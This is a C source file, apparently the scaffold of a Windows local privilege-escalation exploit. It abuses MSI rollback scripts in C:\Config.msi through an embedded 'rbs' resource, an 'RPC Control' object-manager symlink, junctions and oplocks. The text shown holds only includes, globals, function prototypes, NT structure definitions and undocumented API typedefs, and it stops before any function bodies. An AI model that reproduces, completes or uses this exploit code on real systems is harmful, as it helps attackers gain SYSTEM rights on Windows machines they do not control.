#include <windows.h>
#include <combaseapi.h>
#include <Msi.h>
#include <stdio.h>
#include <Shlwapi.h>
#include <PathCch.h>
#include <AclAPI.h>
#include "resource.h"
#include "FileOplock.h"

#pragma comment(lib, "Msi.lib")
#pragma comment(lib,"RpcRT4.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "PathCch.lib")
#pragma warning(disable:4996)


HMODULE hm = GetModuleHandle(NULL);
HRSRC res = FindResource(hm, MAKEINTRESOURCE(IDR_RBS1), L"rbs");
DWORD RbsSize = SizeofResource(hm, res);
void* RbsBuff = LoadResource(hm, res);
NTSTATUS retcode;
HANDLE hFile, hthread,hFile2,hFile3;
wchar_t lpksetup[MAX_PATH] = { 0x0 };
wchar_t lpksetup2[MAX_PATH] = { 0x0 };
wchar_t object[] = L"Global\\GLOBALROOT\\RPC Control\\lpk-tmp-00000009";
wchar_t target[] = L"C:\\Config.msi";
void load();
void Trigger();
DWORD WINAPI install(void*);
void cb2();
void cb1();
void cb0();
BOOL Move(HANDLE hFile);
LPWSTR  BuildPath(LPCWSTR path);
BOOL CreateJunction(LPCWSTR dir, LPCWSTR target);
BOOL DosDeviceSymLink(LPCWSTR object, LPCWSTR target);
BOOL DelDosDeviceSymLink(LPCWSTR object, LPCWSTR target);
BOOL DeleteJunction(LPCWSTR dir);
HANDLE myCreateDirectory(LPCWSTR file, DWORD access, DWORD share, DWORD dispostion);
VOID Fail();

typedef _Return_type_success_(return >= 0) LONG NTSTATUS;
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define FILE_OPEN               0x00000001
#define FILE_CREATE             0x00000002
#define FILE_OPEN_IF                    0x00000003
#define FILE_DIRECTORY_FILE             0x00000001
#define FILE_OPEN_REPARSE_POINT         0x00200000
#define OBJ_INHERIT             			0x00000002L
#define OBJ_PERMANENT           			0x00000010L
#define OBJ_EXCLUSIVE           			0x00000020L
#define OBJ_CASE_INSENSITIVE    			0x00000040L
#define OBJ_OPENIF              			0x00000080L
#define OBJ_OPENLINK            			0x00000100L
#define OBJ_KERNEL_HANDLE       			0x00000200L
#define OBJ_FORCE_ACCESS_CHECK  			0x00000400L
#define OBJ_IGNORE_IMPERSONATED_DEVICEMAP	0x00000800L
#define OBJ_VALID_ATTRIBUTES    			0x00000FF2L

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;
typedef struct _OBJECT_ATTRIBUTES {
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
typedef struct _IO_STATUS_BLOCK {
	union {
		NTSTATUS Status;
		PVOID    Pointer;
	};
	ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;
#define InitializeObjectAttributes( p, n, a, r, s ) {    \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
    (p)->RootDirectory = r;                             \
    (p)->Attributes = a;                                \
    (p)->ObjectName = n;                                \
    (p)->SecurityDescriptor = s;                        \
    (p)->SecurityQualityOfService = NULL;               \
}


typedef struct _PROCESS_BASIC_INFORMATION
{
	LONG ExitStatus;
	PVOID PebBaseAddress;
	ULONG_PTR AffinityMask;
	LONG BasePriority;
	ULONG_PTR UniqueProcessId;
	ULONG_PTR ParentProcessId;
} PROCESS_BASIC_INFORMATION, * PPROCESS_BASIC_INFORMATION;

typedef struct _PEB_LDR_DATA {
	ULONG Length;
	BOOLEAN Initialized;
	HANDLE SsHandle;
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
	PVOID EntryInProgress;
	BOOLEAN ShutdownInProgress;
	HANDLE ShutdownThreadId;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
	BYTE           Reserved1[16];
	PVOID          Reserved2[10];
	UNICODE_STRING ImagePathName;
	UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

// Partial PEB
typedef struct _PEB {
	BOOLEAN InheritedAddressSpace;
	BOOLEAN ReadImageFileExecOptions;
	BOOLEAN BeingDebugged;
	union
	{
		BOOLEAN BitField;
		struct
		{
			BOOLEAN ImageUsesLargePages : 1;
			BOOLEAN IsProtectedProcess : 1;
			BOOLEAN IsLegacyProcess : 1;
			BOOLEAN IsImageDynamicallyRelocated : 1;
			BOOLEAN SkipPatchingUser32Forwarders : 1;
			BOOLEAN SpareBits : 3;
		};
	};
	HANDLE Mutant;

	PVOID ImageBaseAddress;
	PPEB_LDR_DATA Ldr;
	PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
	PVOID SubSystemData;
	PVOID ProcessHeap;
	PRTL_CRITICAL_SECTION FastPebLock;
} PEB, * PPEB;

typedef struct _LDR_DATA_TABLE_ENTRY {
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	union
	{
		LIST_ENTRY InInitializationOrderLinks;
		LIST_ENTRY InProgressLinks;
	};
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	ULONG Flags;
	WORD LoadCount;
	WORD TlsIndex;
	union
	{
		LIST_ENTRY HashLinks;
		struct
		{
			PVOID SectionPointer;
			ULONG CheckSum;
		};
	};
	union
	{
		ULONG TimeDateStamp;
		PVOID LoadedImports;
	};
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;
typedef struct _REPARSE_DATA_BUFFER {
	ULONG  ReparseTag;
	USHORT ReparseDataLength;
	USHORT Reserved;
	union {
		struct {
			USHORT SubstituteNameOffset;
			USHORT SubstituteNameLength;
			USHORT PrintNameOffset;
			USHORT PrintNameLength;
			ULONG  Flags;
			WCHAR  PathBuffer[1];
		} SymbolicLinkReparseBuffer;
		struct {
			USHORT SubstituteNameOffset;
			USHORT SubstituteNameLength;
			USHORT PrintNameOffset;
			USHORT PrintNameLength;
			WCHAR  PathBuffer[1];
		} MountPointReparseBuffer;
		struct {
			UCHAR DataBuffer[1];
		} GenericReparseBuffer;
	} DUMMYUNIONNAME;
} REPARSE_DATA_BUFFER, * PREPARSE_DATA_BUFFER;
typedef struct _OBJECT_DIRECTORY_INFORMATION {
	UNICODE_STRING Name;
	UNICODE_STRING TypeName;
} OBJECT_DIRECTORY_INFORMATION, * POBJECT_DIRECTORY_INFORMATION;
#define STATUS_MORE_ENTRIES 0x00000105
#define STATUS_NO_MORE_ENTRIES 0x8000001A
#define IO_REPARSE_TAG_MOUNT_POINT              (0xA0000003L)

typedef NTSYSAPI NTSTATUS(NTAPI* _NtCreateFile)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK   IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);
typedef NTSYSAPI VOID(NTAPI* _RtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
typedef NTSYSAPI NTSTATUS(NTAPI* _NtOpenDirectoryObject)(OUT PHANDLE DirectoryHandle, IN ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes);
typedef NTSYSAPI NTSTATUS(NTAPI* _NtQueryDirectoryObject)(_In_      HANDLE  DirectoryHandle, _Out_opt_ PVOID   Buffer, _In_ ULONG Length, _In_ BOOLEAN ReturnSingleEntry, _In_  BOOLEAN RestartScan, _Inout_   PULONG  Context, _Out_opt_ PULONG  ReturnLength);
typedef NTSYSCALLAPI NTSTATUS(NTAPI* _NtSetInformationFile)(HANDLE   FileHandle, PIO_STATUS_BLOCK  IoStatusBlock, PVOID  FileInformatio, ULONG  Length, ULONG FileInformationClass);
typedef NTSTATUS(NTAPI* _RtlEnterCriticalSection)(PRTL_CRITICAL_SECTION CriticalSection);
typedef NTSTATUS(NTAPI* _RtlLeaveCriticalSection)(PRTL_CRITICAL_SECTION CriticalSection);
typedef NTSTATUS(NTAPI* _NtQueryInformationProcess)(HANDLE ProcessHandle, DWORD ProcessInformationClass, PVOID ProcessInformation, DWORD ProcessInformationLength, PDWORD ReturnLength);

_RtlInitUnicodeString pRtlInitUnicodeString;
_NtCreateFile pNtCreateFile;
_NtSetInformationFile pNtSetInformationFile;
_NtQueryDirectoryObject pNtQueryDirectoryObject;
_NtOpenDirectoryObject pNtOpenDirectoryObect;
_RtlLeaveCriticalSection pRtlLeaveCriticalSection;
_RtlEnterCriticalSection pRtlEnterCriticalSection;
_NtQueryInformationProcess pNtQueryInformationProcess;
